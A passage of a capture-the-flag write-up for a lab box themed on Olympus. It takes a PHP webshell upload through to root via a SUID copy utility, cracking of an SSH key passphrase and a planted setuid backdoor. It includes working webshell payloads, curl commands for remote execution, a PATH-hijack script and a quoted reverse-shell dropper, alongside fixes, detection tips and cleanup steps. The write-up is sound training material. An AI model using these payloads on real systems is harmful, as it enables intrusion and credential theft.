+> they are sufficient. Here the entire difference between "nothing" and "the rest of the room"
+> lived in the `Location` header.
+>
+> Practical fixes, in order of effort:
+> - **Baseline on more fields.** `-w '%{http_code}:%{size_download}:%{redirect_url}'` costs nothing
+>   and would have caught this instantly.
+> - **In ffuf, filter on what you actually mean.** Instead of `-fc 302`, keep the 302s and look at
+>   them — or use `-fr` (filter by regex on the response) against the known bounce URL.
+> - **Follow redirects when the target is small enough**: `-L` turns both cases into their real
+>   destinations, which differ enormously.
+>
+> Generalised: **when a sweep finds nothing, check whether your filter can even express the
+> difference you are looking for** before you reach for a bigger wordlist. I escalated 87k → 220k
+> words and DoS'd the box, and the answer was in a header I was not reading.
+
+---
+
+## 10. The chat app
+
+```bash
+for p in "" login.php register.php chat.php upload.php uploads/ logout.php reset-password.php; do
+  printf '%-18s -> ' "/$p"
+  curl -s -m 10 -o /dev/null -w '%{http_code}:%{size_download} loc=%{redirect_url}\n' \
+    -H "Host: chat.olympus.thm" "http://10.129.154.75/$p"
+done
+```
+
+| Path | Result |
+|---|---|
+| `/` , `/index.php` | `302` → `login.php` |
+| `/login.php` | `200` — username + password form |
+| `/upload.php` | `200:112` — **runs with no session at all** |
+| `/uploads/` | `200` — the upload directory, served |
+| `/register.php`, `/chat.php` | `404` |
+
+`upload.php` is worth a moment. Fetched with no cookie and no file, it prints its own decision
+tree:
+
+```
+Sorry, file already exists.
+Sorry, only JPG, JPEG, PNG & GIF files are allowed.
+Sorry, your file was not uploaded.
+```
+
+Three checks named out loud, before I have sent a single upload. **An error message that lists
+the rules is a specification of the filter you have to beat.**
+
+Prometheus's password from the CMS works here too:
+
+```bash
+curl -s -i -c chat.jar -H "Host: chat.olympus.thm" \
+  -d "username=prometheus&password=summertime" http://10.129.154.75/login.php
+# location: home.php
+```
+
+**Password reuse across two applications** — the same failure that turns one compromised service
+into a compromised estate in real incidents.
+
+### Reversing the "random" filename
+
+The chat table recorded an attachment:
+
+```
+2022-04-05 | prometheus | Attached : prometheus_password.txt | 47c3210d51761686f3af40a875eeaaea.txt
+```
+
+and two messages explaining it:
+
+> *prometheus:* "I tested an upload and found the upload folder, but it seems the filename got
+> changed somehow because I can't download it back..."
+> *zeus:* "The IT guy used a random file name function to make it harder for attackers to access
+> the uploaded files."
+
+32 hex characters is an MD5. It is not MD5 of the filename — I checked:
+
+```bash
+printf '%s' 'prometheus_password.txt' | md5sum   # efd9f55a... != 47c3210d...
+```
+
+So I made the application tell me. Upload a file, note the local clock either side of the request,
+read back the name it was given, and test the obvious hypothesis:
+
+```bash
+T0=$(date +%s)
+curl -s -b chat.jar -H "Host: chat.olympus.thm" \
+     -F "fileToUpload=@probe2.gif;type=image/gif" -F "submit=1" \
+     http://10.129.154.75/home.php > /dev/null
+T1=$(date +%s)
+# read the stored name back out through the SQLi on the OTHER site
+# -> 47263096a0d7875e2bbf46da8b5389db.gif
+
+for t in $(seq $((T0-60)) $((T1+60))); do
+  h=$(printf '%s' "$t" | md5sum | cut -d' ' -f1)
+  [ "$h" = "47263096a0d7875e2bbf46da8b5389db" ] && echo "MATCH md5($t)"
+done
+```
+```
+MATCH md5(1787610735) = 47263096a0d7875e2bbf46da8b5389db
+```
+
+**The filename is `md5(time())` plus the original extension.** Confirmed by experiment, not by
+reading code — at this point I had no source access at all.
+
+> **Why this is a real vulnerability, not a curiosity.** `time()` is a *second-granularity, fully
+> public* value. It is not a secret, so hashing it produces no secrecy — only obscurity, and only
+> until someone brute-forces a day of seconds (86,400 MD5s, well under a second). Two users
+> uploading in the same second also silently overwrite each other. If you need an unguessable
+> name, you need an unguessable **input**: `random_bytes(16)`, not a timestamp.
+
+### Wrong turn #4 — solving a problem I did not have
+
+I then spent a few minutes writing a Python loop to brute-force `md5(t)` across the whole of
+2022-04-05 to recover `prometheus_password.txt`'s name — and it found nothing across 259,200
+candidates.
+
+Which was fine, because **I already knew the filename.** It was sitting in the `chats.file`
+column I had dumped twenty minutes earlier. The reversal is only necessary if the database is out
+of reach; I had the database. (The row also appears to have been seeded by hand, which is why no
+timestamp in that range reproduces it.)
+
+```bash
+curl -s -b chat.jar -H "Host: chat.olympus.thm" \
+  http://10.129.154.75/uploads/47c3210d51761686f3af40a875eeaaea.txt
+```
+```
+you really thought it would be this easy ?!
+```
+
+Fair enough. But the trip was not wasted — it proved `/uploads/` serves files back, which is the
+precondition for everything in the next section.
+
+---
+
+## 11. Flag 2 — the upload filter that was never applied
+
+`upload.php` told me the rules: JPG, JPEG, PNG, GIF only. But the *actual* upload on `home.php`
+is a different handler. So I tested every extension I could think of and let the database tell me
+what each one became:
+
+```bash
+for n in s.php s.phtml s.php5 s.PHP s.php.gif s.gif.php s.pHp; do
+  printf 'GIF89a;\n<?php echo "RCEOK:".shell_exec($_REQUEST["c"]); ?>\n' > "$n"
+  curl -s -b chat.jar -H "Host: chat.olympus.thm" \
+    -F "fileToUpload=@$n;type=image/gif" -F "submit=1" http://10.129.154.75/home.php
+done
+```
+
+Not one produced an error. Reading the stored names back out through the SQLi:
+
+| Uploaded as | Stored as |
+|---|---|
+| `s.php` | `963cdf89….php` |
+| `s.phtml` | `963cdf89….phtml` |
+| `s.php5` | `963cdf89….php5` |
+| `s.PHP` | `963cdf89….php` (lowercased) |
+| `s.php.gif` | `963cdf89….gif` |
+| `s.gif.php` | `963cdf89….php` |
+
+**`.php` went straight through.** No bypass trick was needed — no double extension, no null byte,
+no magic-byte polyglot. The whitelist simply is not there on this code path.
+
+(All six share one hash because they were uploaded inside the same second — `md5(time())` again,
+each overwriting the last. Only the extension differed.)
+
+```bash
+curl -s -H "Host: chat.olympus.thm" \
+  "http://10.129.154.75/uploads/963cdf89ef9af1fc8a4ca7b2a0ac3d52.php?c=id"
+```
+```
+GIF89a;
+RCEOK:uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
+```
+
+**Remote code execution as `www-data`.**
+
+Once I had root, I read the handler and saw exactly what happened. From
+`/var/www/chat.olympus.thm/public_html/home.php`:
+
+```php
+$FileType = strtolower(pathinfo($target_dir . basename($_FILES["fileToUpload"]["name"]), PATHINFO_EXTENSION));
+$name = md5(time()).'.'.$FileType;
+$target_file = $target_dir . basename($name);
+if ($_FILES["fileToUpload"]["size"] > 500000) { ... }      // size check
+if ($uploadOk == 0) { ... } else { move_uploaded_file(...); }
+```
+
+Compare with `upload.php`, which is never reached:
+
+```php
+if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
+&& $imageFileType != "gif" ) {
+  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
+  $uploadOk = 0;
+}
+```
+
+`home.php` extracts the extension, then **reuses it verbatim** to build the filename — and checks
+only the file size. The whitelist lives in a sibling file that the form does not post to.
+
+> **Two lessons worth carrying into a report.**
+>
+> 1. **Dead code lies to you, in both directions.** `upload.php` is a perfect advertisement for a
+>    filter that does not protect the application. If I had read it first and believed it, I would
+>    have wasted an hour inventing bypasses for a check that never runs. **Test the endpoint the
+>    form actually posts to.**
+> 2. **Renaming a file does not sanitise it.** The developer thought `md5(time()).'.'.$FileType`
+>    was the security control. It controls the *name* and leaves the *type* entirely to the
+>    attacker. The fix is to derive the extension from a server-side whitelist keyed on verified
+>    content — never to echo back what the client sent:
+>    ```php
+>    $allowed = ['image/jpeg'=>'jpg','image/png'=>'png','image/gif'=>'gif'];
+>    $mime = (new finfo(FILEINFO_MIME_TYPE))->file($_FILES['f']['tmp_name']);
+>    if (!isset($allowed[$mime])) { /* reject */ }
+>    $name = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
+>    ```
+>    And serve uploads from a directory where PHP execution is switched off entirely — which,
+>    ironically, is exactly what the old site's `/img/` does.
+
+With RCE, the user flag is one command away:
+
+```bash
+curl -s -H "Host: chat.olympus.thm" --get --data-urlencode "c=cat /home/zeus/user.flag" \
+  "http://10.129.154.75/uploads/963cdf89ef9af1fc8a4ca7b2a0ac3d52.php"
+```
+```
+flag{[redacted]}
+```
+
+`/home/zeus/user.flag` is mode `-rw-rw-r--` — world-readable, so `www-data` can read it without
+any escalation at all.
+
+---
+
+## 12. www-data → zeus: a SUID binary that copies files
+
+`/home/zeus/zeus.txt` sets up the privesc in-story:
+
+```
+Hey zeus !
+I managed to hack my way back into the olympus eventually.
+Looks like the IT kid messed up again !
+I've now got a permanent access as a super user to the olympus.
+                    - Prometheus.
+```
+
+"Permanent access as a super user" = a backdoor left on disk. The standard place to look:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+| Piece | Meaning |
+|---|---|
+| `-perm -4000` | the **setuid** bit is set (`-` means "at least these bits") |
+| `-type f` | regular files only |
+| `2>/dev/null` | discard the permission-denied noise from directories I can't enter |
+
+Almost everything returned is stock Ubuntu — `sudo`, `mount`, `su`, `passwd`, `pkexec`. One is not:
+
+```
+-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
+```
+
+`rws` — setuid, owned by **zeus**. Anything it does to the filesystem, it does with zeus's
+permissions.
+
+```bash
+strings /usr/bin/cputils
+```
+```
+figlet CPutils
+Enter the Name of Source File:
+Enter the Name of Target File:
+Error Occurred!
+File copied successfully.
+fopen  fgetc  fputc  fclose  system
+```
+
+A file-copy utility: prompt for source, prompt for target, copy byte by byte with
+`fgetc`/`fputc`. Plus a `system()` call for the ASCII-art banner.
+
+### Wrong turn #5 — the PATH hijack that looked perfect and did nothing
+
+`system("figlet CPutils")` calls `figlet` **without an absolute path**, so the shell resolves it
+via `$PATH`. Textbook hijack: put my own `figlet` earlier in `$PATH` and a setuid binary runs my
+code as its owner.
+
+```bash
+mkdir -p /tmp/.h9
+printf '#!/bin/bash\nid > /tmp/.h9/out 2>&1\n' > /tmp/.h9/figlet
+chmod 755 /tmp/.h9/figlet
+PATH=/tmp/.h9:$PATH /usr/bin/cputils
+cat /tmp/.h9/out
+```
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
+```
+
+My script ran — and ran as **www-data**, not zeus. No escalation.
+
+**Why:** `system()` executes `/bin/sh -c …`, and on Ubuntu `/bin/sh` is **dash**. Dash (like bash)
+detects when it has been started with `euid != uid` and **drops the effective UID back to the real
+one** unless invoked with `-p`. This is a deliberate defence against exactly this attack, and it
+has been standard for decades. The hijack fires, the privilege does not follow.
+
+> Worth internalising: **`system()` inside a setuid binary is a bug, but not automatically an
+> exploitable one.** It is exploitable when the shell keeps the euid (an old or unusual `/bin/sh`),
+> or when the hijacked command is invoked via `execve` directly rather than through a shell. Test
+> it — do not assume either way. And note this cuts both directions: I would have called it a
+> non-issue on a code review too, and been wrong on a system with a different `/bin/sh`.
+
+### Using the feature instead of the bug
+
+`system()` drops privileges. `fopen()` does not. The **copy itself** runs as zeus, which gives me
+an arbitrary file **read** and an arbitrary file **write** as that user.
+
+First attempt failed:
+
+```bash
+printf "/etc/hostname\n/tmp/.h9/t1\n" | /usr/bin/cputils
+# Error Occurred!
+```
+
+`/tmp/.h9` is mode 755 owned by www-data, so zeus cannot create a file inside it. Targeting
+world-writable `/tmp` directly works:
+
+```bash
+printf "/etc/hostname\n/tmp/t9a\n" | /usr/bin/cputils
+# File copied successfully.
+ls -la /tmp/t9a
+# -rw-r--r-- 1 zeus www-data 17 ...   <- owned by ZEUS. The primitive is confirmed.
+```
+
+That `zeus` in the owner column is the proof. Now read something zeus alone can read:
+
+```bash
+printf "/home/zeus/.ssh/id_rsa\n/tmp/k9a\n" | /usr/bin/cputils
+head -2 /tmp/k9a
+```
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0…[truncated]
+```
+
+`aes256-ctr` and `bcrypt` in the header mean the key is **passphrase-encrypted** — useless as-is.
+
+```bash
+ssh2john zeus_id_rsa > zeuskey.hash
+john --session=sshkey --wordlist=rockyou.txt zeuskey.hash
+john --show zeuskey.hash
+```
+```
+zeus_id_rsa:snowflake
+```
+
+`ssh2john` converts an OpenSSH private key into a hash format John understands; cracking it
+recovers the passphrase without ever touching the target.
+
+```bash
+chmod 600 zeus_id_rsa
+ssh -i zeus_id_rsa zeus@10.129.154.75      # passphrase: snowflake
+```
+```
+uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
+```
+
+**Shell as zeus.**
+
+### The route I actually took first (and why I would not repeat it)
+
+Before the passphrase cracked, I used the same copy primitive to *write*: read zeus's
+`authorized_keys` out to `/tmp`, append my own public key, and copy the result back.
+
+```bash
+printf "/home/zeus/.ssh/authorized_keys\n/tmp/ak_bak\n" | /usr/bin/cputils   # back it up FIRST
+cp /tmp/ak_bak /tmp/ak_new && echo "$MY_PUBKEY" >> /tmp/ak_new
+printf "/tmp/ak_new\n/home/zeus/.ssh/authorized_keys\n" | /usr/bin/cputils
+```
+
+It worked (and emitted `*** stack smashing detected ***` on the way — the binary has a buffer
+overflow in its input handling that the compiler's stack canary caught; the write still landed).
+
+Both routes reach the same shell. The passphrase crack is strictly better practice: it is
+**read-only**. Overwriting `authorized_keys` modifies a file the real owner depends on, and if I
+had not copied the original out first I would have destroyed zeus's own access. When you must
+write to a live system, **back up the target file in the same breath** — and prefer the path that
+does not write at all.
+
+---
+
+## 13. zeus → root
+
+zeus is in the `sudo` group but `sudo -n -l` reports `a password is required`, and I never cracked
+zeus's *account* password (only the SSH key passphrase — different secrets). So sudo is out.
+
+Back to the thing zeus can now read: `/var/www/html`, the **default vhost's** document root — the
+site you get when the `Host:` header matches nothing.
+
+```
+drwxrwx--x 2 root zeus 4096 Jul 15  2022 0aB44fdS3eDnLkpsz3deGv8TttR4sc
+```
+
+Mode `drwxrwx--x`: owner root and group **zeus** get `rwx`; everyone else gets `--x` — *execute*
+without *read*. On a directory those bits mean:
+
+| Bit | On a directory |
+|---|---|
+| `r` | you may **list** the names inside |
+| `x` | you may **traverse** into it and open a file **whose name you already know** |
+
+So `www-data` (and therefore Apache) could serve any file in there, but could never enumerate it —
+which is why the directory survived every sweep. As zeus, `r` applies:
+
+```bash
+ls -la /var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/
+```
+```
+-rwxr-xr-x 1 root zeus    0 Apr 14  2022 index.html
+-rwxr-xr-x 1 root zeus 1589 Jul 15  2022 VIGQFQFMYOST.php
+```
+
+Prometheus's backdoor:
+
+```php
+$pass = "a7c5ffcf139742f52a5267c4a0674129";
+if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form …>');
+...
+$suid_bd = "/lib/defended/libc.so.99";
+$shell = "uname -a; w; $suid_bd";
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+$proc = proc_open($shell, $fdspec, $pipes);
+```
+
+A password-gated reverse-shell dropper — reachable over HTTP at
+`http://<IP>/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php`, on the default vhost, with an
+unguessable 30-character directory name. **Security through obscurity, used properly** (by the
+attacker). No wordlist finds that path; the only way in was to read the filesystem.
+
+The payload it runs is the real prize:
+
+```bash
+file /lib/defended/libc.so.99
+# setuid ELF 64-bit LSB shared object, x86-64 ...
+```
+
+A file named to look like a system library, in a directory named to look like part of the OS,
+carrying the **setuid** bit and owned by root. `/lib/defended/` is not readable by zeus, but — as
+with the web directory — the file itself can still be *executed* by name.
+
+```bash
+echo 'id' | /lib/defended/libc.so.99
+```
+```
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus)
+
+                    ### Congrats !! ###
+                You did it, you defeated the gods.
+                        Hope you had fun !
+                   flag{[redacted]}
+PS : Prometheus left a hidden flag, try and find it !
+     I recommend logging as root over ssh to look for it ;)
+```
+
+**Root.** The flag is printed by the backdoor's own banner.
+
+> **The defensive reading.** This binary is what a persistence implant looks like: named to blend
+> into `/lib`, given a plausible `.so` extension, dropped in a directory whose name reads like
+> hardening ("defended"). Nothing about the path is suspicious at a glance, which is the point.
+> Detection does not come from the name — it comes from the **attribute**:
+> ```bash
+> find / -xdev -perm -4000 -type f 2>/dev/null | sort > suid.now
+> diff suid.baseline suid.now
+> ```
+> A setuid-root file outside the distribution's package manifest is an incident, whatever it is
+> called. `dpkg -S <path>` returning "no path found" on a setuid binary is the check that matters.
+
+---
+
+## 14. The hidden flag
+
+The banner points at one more. With root:
+
+```bash
+grep -rhoaE "(flag|THM)\{[^}]{3,80}\}" / \
+  --exclude-dir=proc --exclude-dir=sys --exclude-dir=snap --exclude-dir=usr \
+  --binary-files=text 2>/dev/null | sort -u
+```
+| Flag | Meaning |
+|---|---|
+| `-r` | recurse |
+| `-h` | don't print filenames (I want values first, locations second) |
+| `-o` | print only the match, not the whole line |
+| `-a` / `--binary-files=text` | scan binaries as text — the root flag lives inside an ELF |
+| `--exclude-dir` | skip virtual filesystems and 40k kernel headers that only waste time |
+
+Four distinct values came back. Locating the one I had not yet placed:
+
+```bash
+grep -rlaE "<a-fragment-of-the-4th-flag>" / --exclude-dir=proc --exclude-dir=sys --binary-files=text 2>/dev/null
+```
+```
+/etc/ssl/private/.b0nus.fl4g
+```
+
+A dotfile in `/etc/ssl/private/` — a root-only directory nobody browses casually, holding a
+file whose name is deliberately misspelled so that `find / -name "*flag*"` misses it. Which it
+did: my earlier `find` for `*flag*` returned only `/home/zeus/user.flag`.
+
+> **Why the content grep beat the filename find.** `find -name "*flag*"` searches *names*;
+> `.b0nus.fl4g` defeats it with leetspeak. `grep -r` searches *contents*, and the flag format
+> `flag{...}` is the one thing the author could not obfuscate without breaking the answer.
+> **When you have root and a known output format, search for the format, not for the filename.**
+
+---
+
+## 15. The four flags
+
+All four are redacted here. The chain that produced each one is above and is fully reproducible.
+
+| # | Where it lives | What you had to do to get it |
+|---|---|---|
+| 1 | MySQL `olympus.flag.flag` | find `/~webmaster/`, UNION SQLi on `search.php` |
+| 2 | `/home/zeus/user.flag` | crack prometheus's bcrypt, find `chat.olympus.thm`, upload `.php`, RCE |
+| 3 | banner of `/lib/defended/libc.so.99` | `cputils` (SUID zeus) → zeus → read the hidden webroot → run the implant |
+| 4 | `/etc/ssl/private/.b0nus.fl4g` | root, then content-grep the filesystem for `flag{` |
+
+```
+Flag 1  flag{[redacted]}
+Flag 2  flag{[redacted]}
+Flag 3  flag{[redacted]}
+Flag 4  flag{[redacted]}
+```
+
+**Verified vs assumed, stated plainly:**
+
+- **Verified:** every flag value was read directly off the target with a command shown above, and
+  each command was re-run to confirm. The `md5(time())` filename scheme was verified by
+  experiment. The `dash` privilege drop was verified by observing `uid=33(www-data)` from inside
+  the hijacked `figlet`.
+- **Assumed:** the **numbering**. The room asks for "Flag 1…4" but the box does not label them.
+  The order above follows the intrusion chain (database → user → root → bonus), which is the
+  natural reading, but I could not submit them to TryHackMe to confirm. If the room rejects one,
+  try swapping 3 and 4 — the bonus flag is the likeliest to be numbered differently.
+
+---
+
+## 16. Cleaning up
+
+Everything I changed on the box, put back:
+
+```bash
+rm /var/www/chat.olympus.thm/public_html/uploads/963cdf89….{php,php5,phtml,gif}   # my webshells
+rm /var/www/chat.olympus.thm/public_html/uploads/1689c6ee….gif 47263096….gif      # my probes
+rm -rf /tmp/.h9 /tmp/t9a /tmp/k9a /tmp/ak_bak /tmp/ak_new /tmp/ak_chk             # my scratch files
+grep -v "recon$" /home/zeus/.ssh/authorized_keys > … && chmod 600 …               # my key, removed
+mysql -u phpmyadmin -p… olympus -e 'delete from chats where …; delete from posts where …'
+grep -v "recon$" /root/.ssh/authorized_keys > … && chmod 600 …                    # last action
+```
+
+Verified afterwards: `/uploads/` holds only its two original 2022 files, `chats` and `posts` are
+back to 3 rows each, and
+
+```bash
+ssh -i olymp_key root@10.129.154.75 'id'
+# root@10.129.154.75: Permission denied (publickey,password).
+```
+
+my access is gone.
+
+> **This is not optional politeness.** A webshell left in an internet-reachable upload directory is
+> a vulnerability *you* introduced, and on a shared lab box the next person inherits it. In a real
+> engagement, unremoved tooling is a finding against you and a genuine liability. Track what you
+> drop as you drop it — that is half the reason these notes get written step by step.
+
+---
+
+## 17. What this box teaches
+
+**On method — the mistakes cost more than the exploits.** Five wrong turns are recorded above, and
+only one was about not knowing a technique:
+
+| # | Mistake | Cost | The habit that fixes it |
+|---|---|---|---|
+| 1 | Guessed Greek-god subdomains before running a wordlist | minutes | Themed guessing supplements a wordlist; it never replaces one |
+| 2 | Put a hostname in `ffuf -u` — every request died at DNS | ~20 min | **Run a known-good control through the same command**; don't `2>/dev/null` a tool you haven't verified |
+| 3 | Scanned at `-t 80` and knocked the box over | ~15 min | When the target slows down, suspect your own traffic first |
+| 4 | Brute-forced `md5(time())` for a filename already in the DB | ~5 min | Ask what you already know before computing it |
+| 5 | Baselined vhosts on status+size, so `Location:` never registered | **hours** | **A baseline is only as good as the field you compare** |
+
+Number 5 is the one to keep. The `chat.olympus.thm` vhost was tested, answered, and thrown away by
+my own filter — a `302:0` from the default vhost and a `302:0` from a real application are
+identical in the two fields I was watching and completely different in the third. Every later
+step, including two flags, was behind it. **Add `%{redirect_url}` to your probe format
+permanently.**
+
+**On the vulnerabilities themselves**, five distinct classes, each a common real-world failure:
+
+1. **An abandoned deployment left running** (`/~webmaster/`). v1 was "retired" by deleting some
+   pages, but `search.php` and the database connection survived. `mod_userdir` kept it reachable
+   and invisible to subdomain enumeration. *Decommission means removing the code and revoking the
+   database credential, not deleting the links.*
+2. **SQL injection via string concatenation** inside a `LIKE`. Fixed by a prepared statement:
+   `WHERE post_tags LIKE CONCAT('%', ?, '%')` with the value bound, never interpolated.
+3. **A weak password plus reuse.** `summertime` fell to rockyou inside a 32-minute session that
+   covered only 0.56% of the list, and the same credential then unlocked a second, unrelated
+   application. bcrypt did its job — at 49 guesses/sec the other two hashes were untouchable. The
+   password did not.
+4. **An upload filter on the wrong file.** `upload.php` validates extensions and is never called;
+   `home.php` accepts anything and preserves the attacker's extension. *Validate at the endpoint
+   the form posts to, derive the extension from verified content, and disable execution in the
+   upload directory.*
+5. **A setuid binary as a general-purpose primitive.** `cputils` was written to copy files, and
+   copying files **as another user** is arbitrary read and arbitrary write as that user. The
+   `system()` PATH hole was the eye-catching bug and turned out to be harmless; the boring
+   documented feature was the actual escalation. *Ask what a privileged program lets you do, not
+   what it was meant to do.*
+
+And the through-line, from `/~webmaster/` to `0aB44fdS3eDnLkpsz3deGv8TttR4sc` to
+`libc.so.99` to `.b0nus.fl4g`: **obscurity is not a control.** Every hidden thing on this box was
+found by reading something the system had to reveal — a directory listing, an e-mail column, a
+file mode, a string in a binary. Hiding raises the cost of discovery. It never removes the thing.
